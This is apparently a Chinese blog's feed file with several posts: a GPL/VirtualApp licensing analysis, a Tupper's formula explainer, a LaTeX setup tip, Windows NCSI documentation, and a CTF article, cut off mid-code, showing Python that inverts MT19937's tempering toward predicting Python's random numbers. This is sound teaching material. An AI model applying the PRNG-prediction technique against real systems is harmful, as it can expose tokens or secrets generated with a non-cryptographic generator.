案”的解读文章）</p><p>但罗盒并非VA的唯一作者，如果要私有化，就要征得所有作者同意，而且还要把商业版收益分给所有作者。这在我国著作权法实施条例中说得很清楚：</p><blockquote><p>《中华人民共和国著作权法实施条例》第九条规定：“合作作品不可以分割使用的，其著作权由各合作作者共同享有，通过协商一致行使；不能协商一致，又无正当理由的，任何一方不得阻止他方行使除转让以外的其他权利，但是所得收益应当合理分配给所有合作作者。”</p></blockquote><p>在VA按照GPL开源期间，有30多位贡献者，这些贡献者，每人都拥有部分版权（著作权）。</p><blockquote><p>法院说：“访问GitHub官网，搜索查看VirtualApp项目的开源许可、合作者、版本等信息。2016年至2017年期间，该项目有三十多位贡献者，其中paulo-raca提交19次（增加721行，删除2622行），prife提交16次（增加274行，减少59行）。该项目于2016年7月7日首次提交并开源。该项目使用了CydiaSubstrate、LAYOUT、FB等开源源代码。”</p></blockquote><p>这些GitHub上的贡献者（也即作者）是否把著作权转让给了罗盒？</p><p>判决中说：</p><blockquote><p>GitHub用户协议条款说：“6.每当您对含有许可协议通知的仓库做出贡献时，您将按照相同的条款许可您的贡献，并且您同意您有权按照这些条款许可您的贡献。如果您有一个单独的协议来根据不同的条款许可您的贡献，例如贡献者许可协议，那么该单独的协议将会取而代之。”</p></blockquote><p><img src="https://googles.plus/images/loading.gif" data-original="/images/git-curlic.webp">GitHub的用户协议条款<ins>4</ins></p><p>由于罗盒与贡献者并没有签单独的协议（GitHub上没有，也未在历次官司中出示），按照GitHub用户协议，贡献者们仅仅是将代码按照GPL授权给罗迪（罗盒）使用，而没有将著作权送出。而GPL是不允许衍生程序闭源的，VA的商业版也必须按照GPL继续开源。</p><p>更不要说，VA中还使用了CydiaSubstrate开源软件，这也是GPL的，按照强传染性，VA是其衍生品，也必须继续使用GPL。（至于LAYOUT、FB是不是GPL的，我懒得查了）</p><p>VA商业版如果继续使用GPL，就要允许别人不买授权也可以商业使用。而且，如果有人从罗盒那里买了商业版VA，他就可以按照GPL第4条，把商业版VA源码放到GitHub上公开，我想这是罗盒所不愿看到的。</p><p>所以，为了避免今后的麻烦，罗盒公司应该正视这个问题，想办法解决（比如完全剥离干净）。</p><p>如果没有解决好，这就始终是一把悬在罗盒上方的达摩克利斯之剑。</p><p>因为谁知道哪天会冒出来一个作者，指控罗盒违背GPL授权，要求罗盒赔偿呢。(至少是索取应得收益)</p><p>如果真有，按照我国法院现在对GPL的理解，罗盒很难打赢官司的。</p><p>文｜卫剑钒</p><hr><ol type="1"><li><ins>《人话解读GPL V3》</ins>&nbsp;</li><li><ins>罗盒诉玩友一案判决书</ins>&nbsp;</li><li><a href="https://jxself.org/translations/gpl-3.zh.shtml">阮坤良版GPLv3翻译</a>&nbsp;</li><li><a href="https://docs.github.com/en/github/site-policy/github-terms-of-service">GitHub用户协议</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> GPL </tag>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>塔珀自指公式</title>
      <link href="/2022/01/20/ta-po-zi-zhi-gong-shi/"/>
      <url>/2022/01/20/ta-po-zi-zhi-gong-shi/</url>
      
        <content type="html"><![CDATA[<p><img src="https://googles.plus/images/loading.gif" data-original="/images/Tupper.png"></p><h1 id="图像包含了自身的函数塔珀自指公式">图像包含了自身的函数——塔珀自指公式</h1><h2 id="前言">前言</h2><p>中学时，我们学习了各种各样的函数，比如 <span class="math inline">\(y= x^2\)</span>, <span class="math inline">\(y = \frac 1x\)</span>，如果把这些函数的图像画在平面直角坐标系上，前者将是一个抛物线（红线），而后者会是一个双曲线（绿线）。如下图：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://viegg.com/tupper/1.jpg" title="双曲线和抛物线" alt="双曲线和抛物线"><figcaption aria-hidden="true">双曲线和抛物线</figcaption></figure><p>当然我们也可以把 x 和 y 都放在等式的同一边，比如 <span class="math inline">\(x^2 + y^2 =1\)</span>，它的图像是一个圆心在原点、半径为 1的圆圈。甚至不一定非要是等式，比如 <span class="math inline">\(x^2 + y^2&lt; 1\)</span>，图像是一个圆饼：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://viegg.com/tupper/2.jpg" alt="不等式图像"><figcaption aria-hidden="true">不等式图像</figcaption></figure><p>如果我告诉你，有一个函数的图像是它自身，你能相信吗？甚至于，这个函数的图像包含了「苟利国家生死以」这几个汉字，你敢信吗？</p><h2 id="函数图像">函数图像</h2><p>上面说到的这个神奇的函数就是本篇文章的主题——<a href="https://en.wikipedia.org/wiki/Tupper%27s_self-referential_formula">Tupper'sself-referential formula</a>，中文名<a href="https://zh.wikipedia.org/wiki/%E5%A1%94%E7%8F%80%E8%87%AA%E6%8C%87%E5%85%AC%E5%BC%8F">「塔珀自指公式」</a>。</p><p>在范围 <span class="math inline">\(0 \leqslant x &lt; 106, k\leqslant y &lt; k+1\)</span> 内，其中，<span class="math inline">\(k=\)</span></p><p><span class="math display">\[4858450636189713423582095962494202044581400587983244549483093085061934704708\\8099284506447698655243648499972470249151191104116057391774078569197543265718\\5544205721044573588368182982375413963433822519945219165128434833290513119319\\9953502413758765239264874613394906870130562295813219481113685339535565290850\\0238750928568926945559742815463865107300491067230589335860525440966643512653\\4936364395712556569593681518433485760526694016125126695142155053955451915378\\5457525756590740540157929001765967965480064427829131488548259914721248506352\\686630476300\]</span></p><p>这个函数在直角坐标系（x 轴从左至右，y 轴从下至上）上的图像如下：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://viegg.com/tupper/0.jpg"></p><p>而它的数学公式是：<br><img src="https://googles.plus/images/loading.gif" data-original="https://viegg.com/tupper/3.jpg"></p><p>Un-fucking-believable! 这难道是巧合？<br>先不论那一大串 k怎么回事，我知道有些公式恐惧症患者可能已经开始打退堂鼓了……</p><p>其实它的原理说白了很简单，厉害点的小学生都能听懂。</p><h2 id="公式详解">公式详解</h2><p>我们来仔细观察一下这个乍看上去让人头大的公式，先向不熟悉数学公式的读者解释两个符号，一个是向下取整符号<code>⌊ ⌋</code>，意味着求某个数的整数部分，比如 ⌊3.14⌋ 就等于 3，⌊2.99⌋还是等于 2。另一个是求余符号 <code>mod</code>， <code>mod(a, b)</code>意味着求 a 除以 b 所得的余数，比如 <span class="math inline">\(mod(3,2)\)</span> 就等于 <span class="math inline">\(1\)</span>。事实上，对于任意一个整数 <span class="math inline">\(n\)</span>，<code>mod(n, 2) &gt; 1/2</code> 等价于n 为奇数。</p><p>至于我们这个复杂的公式，我们把 <span class="math inline">\(mod\)</span> 符号里左边那一大串表达式称为S，它其实在问：<span class="math inline">\(S\)</span> 除以 <span class="math inline">\(2\)</span> 所得的余数，向下取整后是 <span class="math inline">\(1\)</span> 还是 <span class="math inline">\(0\)</span>？更进一步，可以理解为：<strong>S的整数部分是不是奇数？</strong>这里比较难一眼看穿，建议读者自己举几个例子，比如S = 2.4/3.2 等等，重点关注 S 的整数部分对结果的影响。</p><p>接下来我们分析 <span class="math inline">\(S\)</span>，它的表达式为：</p><p><span class="math display">\[\Large {\left\lfloor {\frac{y}{17}} \right\rfloor {2^{ - 17\left\lfloorx \right\rfloor  - \left\lfloor y \right\rfloor \bmod 17}}}\]</span></p><p>考虑幂中负号的作用，<span class="math inline">\(S\)</span> 可以看成是<span class="math inline">\(\lfloor {\frac{y}{17}} \rfloor\)</span> 除以<span class="math inline">\({2^{17\left\lfloor x \right\rfloor {\text{}} + {\text{ }}\left\lfloor y \right\rfloor \bmod 17}}\)</span></p><p>我们先来看分母部分，取整符号太讨厌了，我们假设 <span class="math inline">\(x,y\)</span>都是整数，那么对应到坐标系上就是一个个整数点，考虑向下取整符号的作用，就是把这个整数点右上方<span class="math inline">\(1\times 1\)</span>大小的正方形中的点都投射到左下角的整数点；所以，最终我们得到的图像是一个个<span class="math inline">\(1\times 1\)</span>大小的正方形小方块，这些小方块的左下角就是使得 S整数部分为奇数的整数点。</p><p>那么分母就化成了 <span class="math inline">\(17x + mod(y,17)\)</span>，这不就是在坐标系上数格子嘛！<span class="math inline">\(y\)</span>轴从下至上，<span class="math inline">\(x\)</span>轴从左往右，从左下角以 <span class="math inline">\(0\)</span> 开始数：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://viegg.com/tupper/5.jpg" alt="数格子"><figcaption aria-hidden="true">数格子</figcaption></figure><p>我们再来看分子⌊y/17⌋，它能保证在数格子的时候分子不变吗？当然可以，只要你能保证 <span class="math inline">\(y\)</span> 处在某个范围内，比如 <span class="math inline">\(k \leqslant y &lt; k + 17\)</span>, 而且 k 必须是<span class="math inline">\(17\)</span> 的整数倍。</p><p>那么综合来看 <span class="math inline">\(S\)</span>，它到底在干什么呢？</p><p><strong>一个整数除以 2 的 n次幂，结果的整数部分是不是奇数，等价于，这个整数的二进制表达右数第 n+1位是不是 1</strong></p><p>举几个例子：<br>- 7/4 = 1.75，整数部分为奇数；从二进制的角度来，7 的二进制表达是 111，7除以 2 的 2 次幂，即 111 的右数第 3 位，为 1。<br>- 6/2 = 3，整数部分为奇数；6 的二进制表达为 110，110 的右数第 2 位，为1。<br>- 2/1 = 2，整数部分为偶数；2 的二进制表达为 10，10 的右数第 1 位（2 除以2 的 0 次幂），为 0。</p><p>这就是整个公式的关键所在了。</p><p>在一块宽为 <span class="math inline">\(106\)</span>，高为 <span class="math inline">\(17\)</span> 的格子板上作画，对于每个 <span class="math inline">\(1\times 1\)</span>的小格子，我们要么不涂，要么涂满，涂满的记作 <span class="math inline">\(1\)</span>，没涂的记作 <span class="math inline">\(0\)</span>。我们把这些格子涂成公式的模样，按照数格子的顺序把这些<span class="math inline">\(1\)</span> 和 <span class="math inline">\(0\)</span>连在一起，形成一个长长的二进制数，然后把这个二进制数化为十进制，再乘以<span class="math inline">\(17\)</span>，最后就得到了我们最开始的 <span class="math inline">\(k\)</span>。</p><p>读者甚至可以自己验算一番，比如我想画一条长为 <span class="math inline">\(5\)</span>的竖线，那么我根据上面数格子的图，把要涂黑的地方打勾（记为 <span class="math inline">\(1\)</span>），为了简便计算，我们把竖线的位置定为左下角，那么竖线对应的二进制数就是<span class="math inline">\(11111\)</span>，转化为十进制就是 <span class="math inline">\(2^0 + 2^1 + 2^2 + 2^3 + 2^4 = 1 + 2 + 4 + 8 + 16 =31\)</span>, 再乘以 <span class="math inline">\(17\)</span> 得到 <span class="math inline">\(527\)</span>。把这个数字填到<a href="https://viegg.com/tupper/demo.html">这个页面</a>中，点击作画，它会自动生成对应范围内<span class="math inline">\((0 \leqslant x &lt;106, 527 \leqslant y &lt;544)\)</span>的函数图像。</p><p>最后是膜法时间，当 <span class="math inline">\(k=\)</span></p><pre class="line-numbers language-none"><code class="language-none">17260947413087897812584911285188052838178271756784919147447348873788039199141526127589664367418799056352121368359811233892736906377867549592656169749606768250079480359168435608576481277348810172121164237517361359899448252160618736114641624975214654389556459100552132254866096066796542706544966326066864026591203524178368117449268189614982377742072053621673159967577076063730809500126093843073302811806766443830092294902407510549289684043208160862827167153844024807906566900122266919455307088829865078202176402268932542875433959424<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>时，函数在对应范围内的图像是「苟利国家生死以」，大家可以试试……</p><blockquote><p>Tools: <a href="https://tuppers-formula.ovh/"></a></p><p>References: <a href="https://www.dgp.toronto.edu/public_user/mooncake/"></a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 数学 </tag>
            
            <tag> 插值 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Text LaTex环境配置</title>
      <link href="/2022/01/18/sublime-text-latex-huan-jing-pei-zhi/"/>
      <url>/2022/01/18/sublime-text-latex-huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h3 id="工具">工具</h3><p>https://latextools.readthedocs.io/en/latest/</p><p>Sublime Package: latextools</p><h3 id="faq">FAQ</h3><ul><li>生成PDF后，出现新的Sublime Text窗口</li><li>将LaTexTools中的sublime进程名改为sblm.exe</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Sublime Text </tag>
            
            <tag> LaTex </tag>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 网络连接状态指示器 (NCSI)</title>
      <link href="/2022/01/17/windows-wang-luo-lian-jie-zhuang-tai-zhi-shi-qi-ncsi/"/>
      <url>/2022/01/17/windows-wang-luo-lian-jie-zhuang-tai-zhi-shi-qi-ncsi/</url>
      
        <content type="html"><![CDATA[<p>Windows网络位置感知 (NLA)服务检测网络的属性并确定如何管理与该网络的连接。 NLA使用名为网络连接状态指示器 (NCSI)的组件来确定计算机是否已成功连接到网络，以及网络是否具有 Intranet 或Internet 连接。</p><p>NCSI 同时使用主动和被动探测器。这些探测器由任意网络接口中的更改触发。当按照"症状"部分所述将计算机连接到网络时，NCSI将开始一个包含以下一个或多个内容的进程：</p><ul><li><a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/networking/internet-explorer-edge-open-connect-corporate-public-network#ncsi-active-probes-and-the-network-status-alert">NCSI活动探测器和网络状态警报</a></li><li><a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/networking/internet-explorer-edge-open-connect-corporate-public-network#authentication-and-the-automatic-sign-in-page">身份验证和自动登录页</a></li><li><a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/networking/internet-explorer-edge-open-connect-corporate-public-network#ncsi-passive-monitoring-the-msn-portal-page-and-the-network-status-alert">NCSI被动监视和网络状态警报</a></li></ul><h3 id="ncsi-活动探测器和网络状态警报">NCSI活动探测器和网络状态警报</h3><p>活动探测器过程包括以下步骤：</p><ul><li>Windows 10或更高版本：<ol type="1"><li>NCSI 发送 DNS 请求以解析 <code>www.msftconnecttest.com</code> FQDN的地址。</li><li>如果 NCSI 收到来自 DNS 服务器的有效响应，NCSI 将向 /connecttest.txt发送纯 HTTP GET <code>http://www.msftconnecttest.com</code> 请求。</li><li>如果 NCSI 成功下载该文本文件，它将确保该文件包含 Microsoft 连接Test。</li><li>NCSI 发送另一个 DNS 请求来解析 <code>dns.msftncsi.com</code> FQDN的地址。<ul><li>如果其中任何请求失败，网络警报将显示在任务栏 (如症状) 。如果将鼠标悬停在图标上方，则会看到"无连接"或"受限的 Internet 访问"(，具体取决于哪些请求) 。</li><li>如果所有这些请求都成功，任务栏将显示常见的网络图标。如果将鼠标悬停在图标上方，则会看到"Internet 访问"等消息。</li></ul></li></ol></li><li>Windows 8.1或早期版本：<ol type="1"><li>NCSI 发送 DNS 请求以解析 <code>www.msftncsi.com</code> FQDN的地址。</li><li>如果 NCSI 收到来自 DNS 服务器的有效响应，NCSI 将向 /ncsi.txt 发送纯HTTP GET <code>http://www.msftncsi.com</code> 请求。</li><li>如果 NCSI 成功下载该文本文件，它将确保该文件包含 MicrosoftNCSI。</li><li>NCSI 发送另一个 DNS 请求来解析 <code>dns.msftncsi.com</code> FQDN的地址。<ul><li>如果其中任何请求失败，网络警报将显示在任务栏 (如症状) 。如果将鼠标悬停在图标上方，则会看到"无连接"或"受限的 Internet 访问"(，具体取决于哪些请求) 。</li><li>如果所有这些请求都成功，任务栏将显示常见的网络图标。如果将鼠标悬停在图标上方，则会看到"Internet 访问"等消息。</li></ul></li></ol></li></ul><p>NCSI 和 NLA服务将这些响应与其他信息组合在一起以构建网络连接的配置文件，或标识其现有配置文件。网络连接配置文件提供配置防火墙Windows配置文件时Windows的信息：</p><ul><li>对于经过 Active Directory 身份验证的网络：防火墙域配置文件。</li><li>对于用户已标记为"专用"的网络：防火墙专用配置文件。</li><li>对于用户已标记为"公共"的网络：公共防火墙配置文件。</li></ul><p>备注</p><p>可以使用组策略来限制活动探测器过程，并可以替换其他网站作为目标(尽管此替换不是建议的解决方案) 。 有关更多信息，请参阅以下资源：</p><ul><li><a href="https://docs.microsoft.com/zh-cn/windows/privacy/manage-connections-from-windows-operating-system-components-to-microsoft-services#14-network-connection-status-indicator">管理从Windows操作系统组件到Microsoft 服务 的连接：14.网络连接状态指示器</a></li><li><a href="https://docs.microsoft.com/zh-cn/windows/client-management/mdm/policy-csp-connectivity#connectivity-disallownetworkconnectivityactivetests">策略CSP -连接性：Connectivity/DisallowNetworkConnectivityActiveTests</a></li></ul><h3 id="身份验证和自动登录页">身份验证和自动登录页</h3><p>如果网络需要凭据，Windows打开默认浏览器 (例如 Internet Explorer 或Edge) 。 如果网络有登录页，该页面将显示在浏览器中。</p><p>引入此行为是为了提高Windows用户体验。 在早期版本的Windows，当您连接到要求您进行身份验证的网络时，浏览器窗口不会自动打开。您可能会看到一条消息，指出必须执行进一步操作才能完全连接到网络。若要完成连接，必须单击该消息以打开浏览器窗口 (或手动打开浏览器窗口)输入用户名和密码。</p><p>由于网络不允许在没有凭据的情况下访问Internet，网络警报将显示在任务栏中。</p><h3 id="ncsi-被动监视msn-门户页面和网络状态警报">NCSI 被动监视、MSN门户页面和网络状态警报</h3><p>除了本文介绍的活动探测器之外，NCSI还监视计算机上其他应用程序的网络活动。即使主动探测器进程失败，此被动监视过程也将继续。 NCSI根据其他应用程序是否可以成功建立 TCP 连接来调整其网络状态确定。如果由于活动探测器故障而出现网络警报，则被动探测器成功后，网络警报将消失。</p><p>备注</p><p>NCSI被动监视过程不会将任何信息传输至计算机或从计算机传输，也不读取其他应用程序传输的任何信息。</p><p>在某些情况下，例如，当你连接到使用代理服务器连接到 Internet的网络时，或者当网络限制阻止 NCSI 完成其活动探测器过程时，Windows会在默认浏览器中打开 MSN 门户页面。如果在计算机上分析网络跟踪，则会显示一个 HTTP 连接，后跟与<code>http://www.msftconnecttest.com/redirect</code> MSN 门户的连接。Windows打开此页面，以受益于被动探测器过程。 如果页面加载，NCSI将得出计算机具有 Internet 访问权限的结论。当不同的探测器失败然后成功时，将出现网络状态警报，然后消失。</p><p>备注</p><p>若要防止在计算机连接到具有代理服务器的网络时打开浏览器窗口，您必须配置网络防火墙以允许访问端口80 上的以下 URL：</p><ul><li>*.msftncsi.com</li><li>*.msftconnecttest.com</li></ul><p>有关详细信息，请参阅<a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/networking/use-authenticated-proxy-servers">KB2778122、Using authenticated proxy servers together with Windows8</a></p><h2 id="解决方法">解决方法</h2><p>可以使用注册表或组策略对象或 GPO 中的注册表或组策略对象禁用 NCSI主动或被动 (GPO) 。</p><blockquote><p>注意</p><p>Microsoft 不建议禁用 NCSI 探测器。 多个操作系统组件和应用程序依赖于NCSI。 例如，如果 NCSI 无法正常工作，Microsoft Outlook可能无法连接到邮件服务器，或者 Windows可能无法下载更新，即使计算机已连接到 Internet。</p></blockquote><p>若要使用注册表禁用 NCSI 活动探测器，请配置以下注册表项之一。</p><p>重要：</p><p>请仔细遵循本部分中的步骤进行操作。对注册表修改不当可能会导致严重问题。 修改之前，<a href="https://support.microsoft.com/help/322756">备份注册表以便在发生问题时进行还原</a>。</p><ul><li><p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet\EnableActiveProbing</code></p><ul><li>键类型：DWORD</li><li>值：Decimal 0 (False)</li></ul></li><li><p><code>HKLM\Software\Policies\Microsoft\Windows\NetworkConnectivityStatusIndicator\NoActiveProbe</code></p><ul><li><p>键类型：DWORD</p></li><li><p>值：Decimal 1 (True)</p></li></ul></li></ul><p>备注： 在默认注册表配置中，此注册表项不存在。 必须创建它。若要使用注册表禁用 NCSI 被动探测器，请创建以下注册表项。</p><ul><li><p><code>HKLM\Software\Policies\Microsoft\Windows\NetworkConnectivityStatusIndicator\DisablePassivePolling</code></p><ul><li><p>键类型：DWORD</p></li><li><p>值：Decimal 1 (True)</p><p>备注：在默认注册表配置中，此注册表项不存在。 必须创建它。若要使用组策略禁用 NCSI 活动探测器，请配置以下 GPO：</p></li></ul></li><li><p>计算机配置通信管理通信设置</p><ul><li>值：已启用</li></ul></li></ul><p>若要使用组策略禁用 NCSI 被动探测器，请配置以下 GPO：</p><ul><li>计算机配置<ul><li>值：已启用</li></ul></li></ul><p>References:</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/networking/internet-explorer-edge-open-connect-corporate-public-network"></a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mt19937-梅森旋转算法</title>
      <link href="/2022/01/16/mt19937-mei-sen-xuan-zhuan-suan-fa/"/>
      <url>/2022/01/16/mt19937-mei-sen-xuan-zhuan-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="引言">引言</h2><p>近年来MT19937在各大CTF赛事中出现的频率越来越高，本文主要讨论CTF中的常见的MT相关问题，并利用几道典型的赛题进行实战分析。</p><h2 id="前置知识">前置知识</h2><p>MT19937是一种周期很长的的伪随机数生成算法，可以快速的产生高质量的伪随机数，主要分为三部分。</p><p>如果读者对该算法不了解，可以先参考<a href="https://zh.wikipedia.org/zh-cn/梅森旋转算法">Wiki</a></p><ol type="1"><li>利用seed初始化624的状态</li><li>对状态进行旋转</li><li>根据状态提取伪随机数</li></ol><p>32位的MT19937的python代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_int32</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span> <span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MT19937</span><span class="token punctuation">:</span>    <span class="token comment"># 根据seed初始化624的state</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>mt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">624</span>        self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> seed        self<span class="token punctuation">.</span>mti <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _int32<span class="token punctuation">(</span><span class="token number">1812433253</span> <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token comment"># 提取伪随机数</span>    <span class="token keyword">def</span> <span class="token function">extract_number</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>mti <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>twist<span class="token punctuation">(</span><span class="token punctuation">)</span>        y <span class="token operator">=</span> self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>mti<span class="token punctuation">]</span>        y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&gt;&gt;</span> <span class="token number">11</span>        y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">&amp;</span> <span class="token number">2636928640</span>        y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span> <span class="token operator">&amp;</span> <span class="token number">4022730752</span>        y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&gt;&gt;</span> <span class="token number">18</span>        self<span class="token punctuation">.</span>mti <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>mti <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">624</span>        <span class="token keyword">return</span> _int32<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment"># 对状态进行旋转</span>    <span class="token keyword">def</span> <span class="token function">twist</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            y <span class="token operator">=</span> _int32<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">624</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">397</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">624</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> y <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x9908b0df</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python中内置的Random类就是采用了MT19937算法，getrandbits(32)方法可以获得一个32位随机数</p><h2 id="题型1-逆向-extract_number">题型1 逆向 extract_number</h2><p>首先分析extract_number函数，可以发现输出的伪随机数是对state[i]进行了异或，位运算后的结果。</p><p>逐步分析extract_number</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">=</span> y <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">18</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以发现这一步的运算对操作数y的高18位并没有产生影响，也就是说运算结束后<code>y1 = y ^ ( y&gt;&gt; 18)</code>，得到<code>y1</code>高18位其实就是<code>y</code>的高18位，那么我们就可以得到<code>y&gt;&gt;18</code>的高36位，进而得到<code>y1</code>的高36位，也就是说我们可以在有限步内，获得<code>y</code>的所有信息，即我们可以根据<code>y1</code>逆向<code>y</code>。代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">o <span class="token operator">=</span> <span class="token number">2080737669</span>y <span class="token operator">=</span> o<span class="token operator">^</span>o<span class="token operator">&gt;&gt;</span><span class="token number">18</span><span class="token comment"># 控制位移的次数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">//</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> y<span class="token operator">^</span><span class="token punctuation">(</span>y<span class="token operator">&gt;&gt;</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token operator">==</span>o<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以发现逆向的过程和正向的过程惊人的相似，不得不感叹数学的奇妙。</p><p>继续分析</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span> <span class="token operator">&amp;</span> <span class="token number">4022730752</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这一步位移的方向发生改变，而且增加了掩码，根据运算符的优先级，可以得到</p><p><code>y1 = y^((y&lt;&lt;15)&amp;4022730752)</code>，实际上增加的掩码并没有太大的作用，因为<code>y1</code>的低15位实际上就是<code>y</code>的低15位和<code>4022730752</code>的低15位异或运算的结果，我们只需要<code>y1^4022730752</code>便可以得到<code>y</code>的低15位，于是得到<code>y&lt;&lt;15</code>的低30位，同理可以得到<code>y1</code>的低30位，经过有限步，最终可以得到<code>y</code>的全部信息。代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">o <span class="token operator">=</span> <span class="token number">2080737669</span>y <span class="token operator">=</span> o <span class="token operator">^</span> o <span class="token operator">&lt;&lt;</span> <span 